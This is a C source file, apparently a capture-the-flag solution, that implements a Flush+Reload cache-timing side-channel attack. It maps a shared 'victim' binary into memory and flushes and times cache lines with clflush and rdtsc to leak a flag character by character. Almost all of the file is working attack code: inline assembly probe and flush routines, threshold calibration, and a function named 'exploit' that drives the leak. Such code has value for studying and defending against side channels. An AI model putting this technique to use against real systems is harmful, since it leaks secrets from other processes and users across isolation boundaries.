#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h> /* mmap() is defined in this header */
#include <wchar.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>


#define TOTAL_TESTS	400

#define SIZE_ORDER 81
char flag[2560];


unsigned char order[81]={26, 24, 17, 19, 68, 41, 55, 57, 56, 54, 9, 53, 18, 71, 4, 63, 14, 30, 27, 12, 75, 33, 20, 38, 45, 40, 21, 69, 16, 2, 23, 13, 49, 8, 78, 76, 62, 3, 77, 67, 31, 50, 66, 70, 47, 28, 15, 29, 36, 44, 79, 25, 60, 58, 22, 0, 1, 10, 73, 52, 11, 6, 80, 65, 42, 61, 74, 37, 46, 51, 39, 35, 48, 5, 64, 32, 59, 72, 34, 7, 43};
char unused1[255];
unsigned threshold;




void flush(char *adrs) 
{
	volatile unsigned long time;
	asm __volatile__ (
	" clflush 0(%0) \n"
	" mfence \n"
	" lfence \n"

 : 
 : "c" (adrs)
 : );
}

unsigned long probe(char *adrs) 
{
	volatile unsigned long time;
	asm __volatile__ (
	" mfence \n"
	" lfence \n"
	" rdtsc \n"
	" lfence \n"
	" movl %%eax, %%esi \n"
	" movl (%1), %%eax \n"
	" lfence \n"
	" rdtsc \n"
	" subl %%esi, %%eax \n"
	" clflush 0(%1) \n"

 : "=a" (time)
 : "c" (adrs)
 : "%esi", "%edx");
 return time;
}





void ComputeThreshold(){

  unsigned long t1,t2;
  unsigned long count=0;
  double total_access,total_evict;
  int volatile tmp;
  total_access=0;
  total_evict=0;

  for(unsigned i=0;i<(TOTAL_TESTS *2);i++){
    if (i%2==0){
      tmp=(unused1[44]);
    }
    t1=probe((char *)&unused1[44]);
    count++;
    if (i%2==0){
      //printf("time w acess: %lu\n",t1);
      total_access+=(double)t1;

    }
    else{
      //printf("time no acess: %lu\n",t1);
      total_evict+=(double)t1;
    }
    //ensures that clflush will be called before entering in a new loop test
    asm __volatile__("mfence\nlfence\n");

  }
  total_access=total_access/TOTAL_TESTS;
  total_evict=total_evict/TOTAL_TESTS;
  printf("avg cached=0x%x\n",(int)total_access);
  printf("avg evicted=0x%x\n",(int)total_evict);

  threshold= (unsigned)(total_evict*0.1+total_access*0.9);
  threshold= 0xa0;
  printf("Usign Threshold %lu\n",threshold);
}
int CheckGlobal(wchar_t *emojis){
	
  unsigned char i;
  unsigned long t;
  static unsigned c=0;
  while (c<2500){
  	for(i=0;i<SIZE_ORDER;i++){
		t=probe((char *)&emojis[order[i]*160]);
		if (t<threshold){
			flag[c]=order[i]+'-';
			printf("%c",flag[c]);
			c++;
		}
  	}
	usleep(90);
  }

}


void exploit(char *src){
	ComputeThreshold();
	memset(flag,0,sizeof(flag));
      	CheckGlobal((wchar_t *)src);
	printf("flag %s\n",flag);

  

}

int main (int argc, char *argv[])
{
 int fdin, fdout;
 char *src, *dst;
 struct stat statbuf;


 /* open the input file */
 if ((fdin = open ("victim", O_RDONLY)) < 0)
   {printf("can't open for reading\n");
    return 0;
   }


 /* find size of input file */
 if (fstat (fdin,&statbuf) < 0){
    printf ("fstat error\n");
    return 0;
   }


 /* mmap the input file */
 if ((src = mmap (0, statbuf.st_size, PROT_READ, MAP_SHARED, fdin, 0))
   == (caddr_t) -1)
   {printf ("mmap error for input\n");
    return 0;
   }

  printf("src: %p %s\n",src,src);
  dst=src+0x2020;
  printf("src: %p %lx\n",dst,dst);
  exploit(dst);
}  
